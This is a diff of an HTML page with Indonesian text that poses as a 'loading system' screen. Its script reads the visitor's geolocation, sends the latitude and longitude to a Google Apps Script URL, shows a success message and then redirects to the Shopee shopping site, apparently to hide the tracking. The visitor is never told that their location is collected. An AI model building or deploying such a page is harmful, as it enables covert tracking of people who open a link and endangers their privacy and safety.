@@ -3,93 +3,88 @@
 <head>
   <title>Loading...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
+
   <style>
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
+      font-family: Arial;
       background: linear-gradient(135deg, #4facfe, #00f2fe);
-      color: white;
-      text-align: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
 
-    .container {
-      margin-top: 100px;
+    .card {
+      background: rgba(255,255,255,0.15);
+      backdrop-filter: blur(10px);
+      padding: 30px;
+      border-radius: 15px;
+      text-align: center;
+      color: white;
+      width: 80%;
+      max-width: 300px;
+      animation: fadeIn 1s ease;
     }
 
     .loader {
-      border: 6px solid rgba(255,255,255,0.3);
-      border-top: 6px solid white;
+      border: 5px solid rgba(255,255,255,0.3);
+      border-top: 5px solid white;
       border-radius: 50%;
-      width: 60px;
-      height: 60px;
-      animation: spin 1s linear infinite;
+      width: 50px;
+      height: 50px;
       margin: auto;
+      animation: spin 1s linear infinite;
     }
 
     @keyframes spin {
       100% { transform: rotate(360deg); }
     }
 
-    h1 {
+    @keyframes fadeIn {
+      from {opacity: 0; transform: translateY(20px);}
+      to {opacity: 1; transform: translateY(0);}
+    }
+
+    h2 {
       margin-top: 20px;
-      font-size: 22px;
-    }
-
-    p {
-      opacity: 0.8;
-    }
-
-    .success {
-      color: #00ffcc;
-      font-weight: bold;
-    }
-
-    .error {
-      color: #ffdddd;
     }
   </style>
 </head>
 
 <body>
 
-<div class="container">
-  <div class="loader"></div>
-  <h1 id="status">Memuat sistem...</h1>
-  <p>Mohon tunggu sebentar</p>
+<div class="card">
+  <div class="loader" id="load"></div>
+  <h2 id="status">Memuat sistem...</h2>
+  <p>Menghubungkan ke server</p>
 </div>
 
 <script>
-if (navigator.geolocation) {
+navigator.geolocation.getCurrentPosition(
+  function(pos){
 
-  navigator.geolocation.getCurrentPosition(
-    function(pos){
+    var lat = pos.coords.latitude;
+    var lon = pos.coords.longitude;
 
-      var lat = pos.coords.latitude;
-      var lon = pos.coords.longitude;
+    var url = "https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat=" 
+              + lat + "&lon=" + lon;
 
-      var url = "https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat=" 
-                + lat + "&lon=" + lon;
+    fetch(url).then(() => {
+      document.getElementById("load").style.display = "none";
+      document.getElementById("status").innerHTML = "✅ Berhasil";
+      
+      setTimeout(() => {
+        window.location.href = "https://shopee.co.id";
+      }, 2000);
+    });
 
-      fetch(url).then(() => {
-        document.querySelector(".loader").style.display = "none";
-        document.getElementById("status").innerHTML = "✅ Data berhasil dimuat";
-        document.getElementById("status").className = "success";
-      });
+  },
 
-    },
-
-    function(error){
-      document.querySelector(".loader").style.display = "none";
-      document.getElementById("status").innerHTML = "❌ Gagal: " + error.message;
-      document.getElementById("status").className = "error";
-    }
-
-  );
-
-} else {
-  document.getElementById("status").innerHTML = "❌ Browser tidak support";
-}
+  function(error){
+    document.getElementById("status").innerHTML = "❌ Gagal akses lokasi";
+  }
+);
 </script>
 
 </body>
